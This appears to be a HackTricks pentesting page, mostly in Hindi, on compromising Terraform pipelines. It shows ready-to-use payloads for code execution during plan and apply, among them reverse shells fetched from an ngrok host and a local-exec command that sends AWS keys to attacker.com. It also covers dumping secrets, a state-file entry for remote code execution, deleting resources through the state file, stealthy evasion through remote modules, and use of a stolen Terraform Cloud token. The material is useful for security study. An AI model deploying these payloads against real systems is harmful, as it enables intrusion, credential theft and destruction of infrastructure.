# Terraform рд╕реБрд░рдХреНрд╖рд╛

{{#include ../banners/hacktricks-training.md}}

## рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА

[From the docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform рдПрдХ **infrastructure as code tool** рд╣реИ рдЬреЛ рдЖрдкрдХреЛ human-readable configuration рдлрд╛рдЗрд▓реЛрдВ рдореЗрдВ рджреЛрдиреЛрдВ **cloud рдФрд░ on-prem resources** рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рджреЗрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк version, reuse, рдФрд░ share рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдлрд┐рд░ рдПрдХ рд╕реБрд╕рдВрдЧрдд workflow рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рдкреВрд░реЗ infrastructure рдХреЛ рдЙрд╕рдХреЗ lifecycle рдХреЗ рджреМрд░рд╛рди provision рдФрд░ manage рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред Terraform compute, storage, рдФрд░ networking рдЬреИрд╕реЗ low-level components рдХреЗ рд╕рд╛рде-рд╕рд╛рде DNS entries рдФрд░ SaaS features рдЬреИрд╕реЗ high-level components рдХреЛ рднреА manage рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### Terraform рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ?

Terraform cloud platforms рдФрд░ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рдЙрдирдХреЗ application programming interfaces (APIs) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ resources рдмрдирд╛рддрд╛ рдФрд░ manage рдХрд░рддрд╛ рд╣реИред Providers Terraform рдХреЛ рдХрд┐рд╕реА рднреА рдРрд╕реЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдпрд╛ рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рддреЗ рд╣реИрдВ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ accessible API рд╣реЛред

![](<../images/image (177).png>)

HashiCorp рдФрд░ Terraform community рдиреЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **1700 рд╕реЗ рдЕрдзрд┐рдХ providers** рд▓рд┐рдЦреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдЬрд╛рд░реЛрдВ рддрд░рд╣ рдХреЗ resources рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ manage рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдФрд░ рдпрд╣ рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝рддреА рдЬрд╛ рд░рд╣реА рд╣реИред рдЖрдк рд╕рднреА publicly available providers рдХреЛ [Terraform Registry](https://registry.terraform.io/) рдкрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, рдФрд░ рдмрд╣реБрдд рдХреБрдЫ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

Core Terraform workflow рддреАрди рдЪрд░рдгреЛрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ:

- **Write:** рдЖрдк resources рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдХрдИ cloud providers рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдПрдХ configuration рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ Virtual Private Cloud (VPC) рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ virtual machines рдкрд░ рдПрдХ application deploy рдХрд░реЗ, рдЬрд┐рд╕рдореЗрдВ security groups рдФрд░ рдПрдХ load balancer рд╣реЛред
- **Plan:** Terraform рдПрдХ execution plan рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рдЙрд╕ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХрд╛ рд╡рд░реНрдгрди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдпрд╣ create, update, рдпрд╛ destroy рдХрд░реЗрдЧрд╛, рдореМрдЬреВрджрд╛ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдФрд░ рдЖрдкрдХреА configuration рдХреЗ рдЖрдзрд╛рд░ рдкрд░ред
- **Apply:** рдЕрдиреБрдореЛрджрди рдкрд░, Terraform рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд operations рдХреЛ рд╕рд╣реА рдХреНрд░рдо рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА resource dependencies рдХрд╛ рд╕рдореНрдорд╛рди рдХрд░рддреЗ рд╣реБрдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА VPC рдХреА properties рдЕрдкрдбреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ VPC рдореЗрдВ virtual machines рдХреА рд╕рдВрдЦреНрдпрд╛ рдмрджрд▓рддреЗ рд╣реИрдВ, рддреЛ Terraform virtual machines рдХреЛ рд╕реНрдХреЗрд▓ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ VPC рдХреЛ recreate рдХрд░реЗрдЧрд╛ред

![](<../images/image (215).png>)

### Terraform рд▓реИрдм

рдмрд╕ рдЕрдкрдиреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдореЗрдВ Terraform рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВред

рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) рд╣реИ рдФрд░ рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ Terraform рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ [best way to download terraform](https://www.terraform.io/downloads) рд╣реИред

## RCE in Terraform: config file poisoning

Terraform **рдХреЛ рдХреЛрдИ рдРрд╕реА рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд╕реЗрд╡рд╛ рдирд╣реАрдВ рджреЗрддреА рдЬреЛ рд╡реЗрдм рдкреЗрдЬ рдпрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕рд░реНрд╡рд┐рд╕ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░реЗ** рдЬрд┐рд╕реЗ рд╣рдо enumerate рдХрд░ рд╕рдХреЗрдВ, рдЗрд╕рд▓рд┐рдП Terraform рдХреЛ compromise рдХрд░рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк **terraform configuration files рдХреЛ add/modify рдХрд░ рд╕рдХреЗрдВ** рдпрд╛ **terraform state file рдХреЛ modify рдХрд░ рд╕рдХреЗрдВ** (рдиреАрдЪреЗ рдЕрдзреНрдпрд╛рдп рджреЗрдЦреЗрдВ)ред

рд╣рд╛рд▓рд╛рдБрдХрд┐, Terraform compromise рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рдмрд╣реБрдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрдВрдкреЛрдиреЗрдВрдЯ** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ **privileged access** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдПрдХ attacker рдХреЗ рд▓рд┐рдП рдЙрд╕ рд╕рд┐рд╕реНрдЯрдо рдХреЛ compromise рдХрд░рдиреЗ рдХрд╛ рдореБрдЦреНрдп рддрд░реАрдХрд╛ рдЬрд╣рд╛рдБ Terraform рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рд╡рд╣ рд╣реИ **repository рдЬрд┐рд╕реЗ terraform configurations рд╕реНрдЯреЛрд░ рдХрд░рддреЗ рд╣реИрдВ рдЙрд╕реЗ compromise рдХрд░рдирд╛**, рдХреНрдпреЛрдВрдХрд┐ рдХрд┐рд╕реА рди рдХрд┐рд╕реА рдмрд┐рдВрджреБ рдкрд░ рд╡реЗ interpret рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред

рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рдРрд╕реА solutions рд╣реИрдВ рдЬреЛ **рдПрдХ PR рдмрдирдиреЗ рдХреЗ рдмрд╛рдж terraform plan/apply рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ execute** рдХрд░ рджреЗрддреА рд╣реИрдВ, рдЬреИрд╕реЗ **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА terraform рдлрд╝рд╛рдЗрд▓ рдХреЛ compromise рдХрд░ рдкрд╛рддреЗ рд╣реИрдВ рддреЛ рдРрд╕реЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВ рдЬрд┐рдирд╕реЗ рдЖрдк RCE рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдХреЛрдИ `terraform plan` рдпрд╛ `terraform apply` execute рдХрд░рддрд╛ рд╣реИред

### Terraform plan

Terraform plan terraform рдХрд╛ **рд╕рдмрд╕реЗ рдЬреНрдпрд╛рджрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ command** рд╣реИ рдФрд░ developers/solutions рдЬреЛ Terraform рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рд╡реЛ рдЗрд╕реЗ рдмрд╛рд░-рдмрд╛рд░ рдЪрд▓рд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП **RCE рдкрд╛рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛** рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк рдРрд╕рд╛ terraform config file poison рдХрд░реЗрдВ рдЬреЛ `terraform plan` рдореЗрдВ arbitrary commands execute рдХрд░ рджреЗред

**Using an external provider**

Terraform [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) рдСрдлрд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ Terraform рдФрд░ external programs рдХреЗ рдмреАрдЪ interface рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рджреЗрддрд╛ рд╣реИред рдЖрдк `external` data source рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `plan` рдХреЗ рджреМрд░рд╛рди arbitrary code рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХ terraform config рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕реА рдЪреАрдЬ inject рдХрд░рдиреЗ рд╕реЗ `terraform plan` execute рдХрд░рдиреЗ рдкрд░ рдПрдХ rev shell рдЪрд▓ рдЬрд╛рдПрдЧреА:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**рдХрд╕реНрдЯрдо provider рдХрд╛ рдЙрдкрдпреЛрдЧ**

рдПрдХ attacker [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) рдХреЛ [Terraform Registry](https://registry.terraform.io/) рдкрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕реЗ Terraform code рдореЗрдВ feature branch рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Provider рдХреЛ `init` рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `plan` рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдкрд░ рдпрд╣ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдЪрд▓рд╛рдПрдЧрд╛

You can find an example in [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**

рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рджреЛрдиреЛрдВ рд╡рд┐рдХрд▓реНрдк рдЙрдкрдпреЛрдЧреА рд╣реИрдВ рд▓реЗрдХрд┐рди рдмрд╣реБрдд рдЫрд┐рдкреЗ рд╣реБрдП рдирд╣реАрдВ рд╣реИрдВ (рджреВрд╕рд░рд╛ рдкрд╣рд▓реЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЕрдзрд┐рдХ рдЫрд┐рдкрд╛ рд╣реБрдЖ рд╣реИ рдкрд░ рдкрд╣рд▓реЗ рд╕реЗ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓)ред рдЖрдк рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдФрд░ рднреА рдЕрдзрд┐рдХ рдЫрд┐рдкреЗ рд╣реБрдП рддрд░реАрдХреЗ рд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдирд┐рдореНрди рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ:

- рд╕реАрдзреЗ terraform file рдореЗрдВ rev shell рдЬреЛрдбрд╝рдиреЗ рдХреА рдмрдЬрд╛рдп, рдЖрдк rev shell рдХреЛ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рдПрдХ **рдмрд╛рд╣рд░реА resource рдХреЛ рд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
рдЖрдк rev shell рдХреЛрдб рдЗрд╕ рд▓рд┐рдВрдХ рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- рдмрд╛рд╣рд░реА resource рдореЗрдВ, repo рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рдмреНрд░рд╛рдВрдЪ рдореЗрдВ рдореМрдЬреВрдж **terraform rev shell code** рдХреЛ рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **ref** рдлреАрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдХреБрдЫ рдЗрд╕ рддрд░рд╣: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply рд╕рднреА рдкрд░рд┐рд╡рд░реНрддрди рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЖрдк рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
рдЖрдкрдХреЛ рдмрд╕ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реИ рдХрд┐ рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдХрд┐рд╕реА payload рдХреЛ `main.tf` рдлрд╛рдЗрд▓ рдХреЗ рдЕрдВрдд рдореЗрдВ рд░рдЦрд╛ рдЧрдпрд╛ рд╣реЛ:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдХреЗ **рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ** рддрд╛рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ **рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрднреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ рдЕрдзрд┐рдХ рдЫрд┐рдкрдХрд░** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

## Secrets Dumps

рдЖрдк terraform file рдореЗрдВ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдЬреЛрдбрд╝рдХрд░ `terraform apply` рдЪрд▓рд╛рдиреЗ рдкрд░ **secret values used by terraform dumped** рдХрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform State Files рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ terraform state files рдкрд░ write access рд╣реИ рд▓реЗрдХрд┐рди рдЖрдк terraform code рдХреЛ рдмрджрд▓ рдирд╣реАрдВ рд╕рдХрддреЗ, рддреЛ [**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) рдлрд╛рдЗрд▓ рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛рдиреЗ рдХреЗ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╡рд┐рдХрд▓реНрдк рджреЗрддреА рд╣реИред рднрд▓реЗ рд╣реА рдЖрдкрдХреЗ рдкрд╛рд╕ config files рдкрд░ write access рд╣реЛ, state files рдХреЗ рд╡реЗрдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдХреНрд╕рд░ рдХрд╣реАрдВ рдЬрд╝реНрдпрд╛рджрд╛ рдЫрд┐рдкрд╛ рд╣реБрдЖ (sneaky) рд╣реЛрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЖрдк `git` history рдореЗрдВ рдирд┐рд╢рд╛рди рдирд╣реАрдВ рдЫреЛрдбрд╝рддреЗред

### RCE in Terraform: config file poisoning

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) рдФрд░ terraform state file рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдПрдХ provider рдХреЛ malicious рд╡рд╛рд▓реЗ рд╕реЗ replace рдХрд░ рджреЗрдВ рдпрд╛ malicious provider рдХреЛ reference рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ fake resource рдЬреЛрдбрд╝ рджреЗрдВред

The provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) рдЗрд╕ рд░рд┐рд╕рд░реНрдЪ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ рдФрд░ рдЗрд╕ рд╕рд┐рджреНрдзрд╛рдВрдд рдХреЛ weaponize рдХрд░рддрд╛ рд╣реИред рдЖрдк рдПрдХ fake resource рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ attribute `command` рдореЗрдВ рдЕрдкрдирд╛ arbitrary bash command рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдЬрдм `terraform` run trigger рд╣реЛрдЧрд╛, рдпрд╣ рджреЛрдиреЛрдВ `terraform plan` рдФрд░ `terraform apply` рдЪрд░рдгреЛрдВ рдореЗрдВ рдкрдврд╝рд╛ рдФрд░ execute рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред `terraform apply` рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, `terraform` рдЖрдкрдХреЗ command рдХреЛ execute рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж state file рд╕реЗ fake resource рдХреЛ delete рдХрд░ рджреЗрдЧрд╛, рдЕрдкрдиреЗ рдЖрдк cleanup рдХрд░рддреЗ рд╣реБрдПред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рдкреВрд░рд╛ demo рдЗрд╕ provider рдХреЗ source code рдХреЛ рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce) рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕реЗ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдмрд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ `resources` array рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рди рдкрд░ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ рдФрд░ `name` рдФрд░ `command` attributes рдХреЛ customize рдХрд░реЗрдВ:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
рдлрд┐рд░, рдЬреИрд╕реЗ рд╣реА `terraform` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЖрдкрдХрд╛ рдХреЛрдб рдЪрд▓ рдЬрд╛рдПрдЧрд╛ред

### рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╣рдЯрд╛рдирд╛ <a href="#deleting-resources" id="deleting-resources"></a>

рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдирд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ 2 рддрд░реАрдХреЗ рд╣реИрдВ:

1. **рдирд╖реНрдЯ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ resource рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддреЗ рд╣реБрдП state рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдирд╛рдо рдХреЗ рд╕рд╛рде resource рдбрд╛рд▓реЗрдВ**

рдХреНрдпреЛрдВрдХрд┐ `terraform` рджреЗрдЦреЗрдЧрд╛ рдХрд┐ рд╡рд╣ resource рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдпрд╣ рдЙрд╕реЗ рдирд╖реНрдЯ рдХрд░ рджреЗрдЧрд╛ (рджрд┐рдП рдЧрдП рд╡рд╛рд╕реНрддрд╡рд┐рдХ resource ID рдХреЗ рдЕрдиреБрд╕рд╛рд░)ред рдЙрджрд╛рд╣рд░рдг рдкрд┐рдЫрд▓реЗ рдкреГрд╖реНрда рд╕реЗ:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Resource рдХреЛ рдРрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЙрд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рди рд╣реЛ (рддрд╛рдХрд┐ рд╡рд╣ рд╣рдЯрд╛рдпрд╛ рдЬрд╛рдП рдФрд░ рдлрд┐рд░ рд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛рдП)**

EC2 instance рдХреЗ рд▓рд┐рдП, instance рдХреЗ type рдХреЛ рдмрджрд▓рдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ terraform рдЙрд╕реЗ рд╣рдЯрд╛рдХрд░ рдлрд┐рд░ рд╕реЗ рдмрдирд╛ рджреЗред

### рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд┐рдП рдЧрдП рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЛ рдмрджрд▓реЗрдВ

рдЕрдЧрд░ рдЖрдкрдХреЛ рдРрд╕реА рд╕реНрдерд┐рддрд┐ рдорд┐рд▓реЗ рдЬрд╣рд╛рдБ `hashicorp/external` рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рддреЛ рдЖрдк рдиреАрдЪреЗ рджрд┐рдП рддрд░реАрдХреЗ рд╕реЗ `external` provider рдХреЛ рдкреБрдирдГ рд▓рд╛рдЧреВ (re-implement) рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдиреЛрдЯ: рд╣рдо external provider рдХреЗ рдПрдХ fork рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ https://registry.terraform.io/providers/nazarewk/external/latest рдкрд░ рдкреНрд░рдХрд╛рд╢рд┐рдд рд╣реИред рдЖрдк рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ fork рдпрд╛ re-implementation рднреА рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
рддрдм рдЖрдк рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ `external` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп Terraform Cloud (TFC) runners рдХрд╛ speculative plans рдХреЗ рджреМрд░рд╛рди рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рдХреНрд╖реНрдп рдХреНрд▓рд╛рдЙрдб рдЦрд╛рддреЗ рдореЗрдВ pivot рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рджрд┐рдЦрд╛рддрд╛ рд╣реИред

- рдкреВрд░реНрд╡рд╢рд░реНрддреЗрдВ:
- рдПрдХ developer рдорд╢реАрди рд╕реЗ Terraform Cloud token рдЪреБрд░рд╛рдПрдБред CLI tokens рдХреЛ plaintext рдореЗрдВ `~/.terraform.d/credentials.tfrc.json` рдкрд░ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИред
- рдЯреЛрдХрди рдХреЗ рдкрд╛рд╕ рд▓рдХреНрд╖реНрдп organization/workspace рддрдХ рдкрд╣реБрдБрдЪ рдФрд░ рдХрдо рд╕реЗ рдХрдо `plan` permission рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред VCS-backed workspaces CLI рд╕реЗ `apply` рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддреЗ рд╣реИрдВ, рдкрд░ рдлрд┐рд░ рднреА speculative plans рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

- TFC API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ workspace рдФрд░ VCS рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдЦреЛрдЬреЗрдВ:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
